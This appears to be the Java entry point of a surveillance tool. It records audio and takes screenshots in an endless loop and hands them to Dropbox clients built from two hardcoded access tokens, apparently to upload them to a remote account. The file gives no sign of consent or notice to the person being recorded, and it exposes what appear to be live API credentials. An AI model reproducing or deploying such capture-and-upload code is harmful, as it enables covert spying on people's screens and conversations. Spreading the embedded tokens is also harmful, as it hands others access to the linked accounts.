import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;

public class Main {
    public static void main(String[] args) {
        String ACCESS_TOKEN_SOUND = "sl.AnKUhXk0BgCkmZzIhCd-RAow2AUzvVLMsdOfQ3nJrWdxZ2l0Ewg2jSfx2vrpBOY8DoZPen34VFyRQRgD" +
                "9bej34Mz3iZ71VTl7YZwtYNl68aQrgK51083MjEWJopRsDGYk8ZuJQQ";
        String ACCESS_TOKEN_SCREEN = "sl.AnK8UmhI-033GI3gG5jiLjsv_YV1xLV-i6DEl_ivSF5SdIinI8Jmy59CHKxQqtz5lOTmrnlzovWoq5G" +
                "-w-l1-KF_mreXSlf0S6DIz4jcgmLzGg_-hB6ky7ckeocxGpfwDs6cYuI";


        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        long startTime = System.currentTimeMillis();
        int counter1,counter2;
        counter1 = counter2 = 0;
        long time = 0;
        while (true) {
            DbxClientV2 client1 = new DbxClientV2(config, ACCESS_TOKEN_SOUND);
            JavaSoundRecorder recorder = new JavaSoundRecorder(client1, 10000);
            DbxClientV2 client2 = new DbxClientV2(config, ACCESS_TOKEN_SCREEN);
            Screen thread = new Screen(client2);
            if(time == 0){
                thread.start();
                recorder.recordAudio();
            }
            time = System.currentTimeMillis() - startTime;
            if(time - (5000*counter1) >= 5000){
                thread.start();
                counter1++;
            }
            if(time - (11000*counter2) >= 11000){
                recorder.recordAudio();
                counter2++;
            }
        }
    }
}